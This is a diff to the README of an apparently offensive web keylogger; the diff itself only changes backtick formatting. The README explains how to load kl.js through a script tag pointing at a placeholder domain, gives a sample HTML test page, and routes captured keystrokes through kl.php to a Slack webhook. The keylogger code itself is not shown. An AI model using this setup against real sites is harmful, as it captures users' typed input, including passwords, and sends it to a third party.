@@ -6,7 +6,7 @@ I wanted to improve upon my XSS API by adding support for capturing all keystrok
 
 # Instructions
 
-Simply host the Keylogger client-side JavaScript (kl.js) on a webserver that's publicly accessible, or embed it directly within your HTML.  If hosting it, simply call it like you would any JS with `<script src="https://YOUR_DOMAIN_HERE/kl.js"></script>`.
+Simply host the Keylogger client-side JavaScript (kl.js) on a webserver that's publicly accessible, or embed it directly within your HTML.  If hosting it, simply call it like you would any JS with ``<script src="https://YOUR_DOMAIN_HERE/kl.js"></script>``.
 
 Host the Keylogger server-side PHP API (kl.php) on your web server and be sure to edit the variables to point to your Slack Channel via a Webhook.
 
@@ -14,7 +14,7 @@ Host the Keylogger server-side PHP API (kl.php) on your web server and be sure t
 
 Test it out with something as simple as this : 
 
-`<HTML>
+``<HTML>
 <BODY>
 <SCRIPT SRC="https://YOUR_DOMAIN_HERE/kl.js">
 </SCRIPT>
@@ -29,7 +29,7 @@ Test it out with something as simple as this :
 <BUTTON TYPE="button">SUBMIT</BUTTON>
 </CENTER>
 </BODY>
-</HTML>`
+</HTML>``
 
 <p align="center"><img align="center" width="600" alt="Client Example" src=""></p>
 
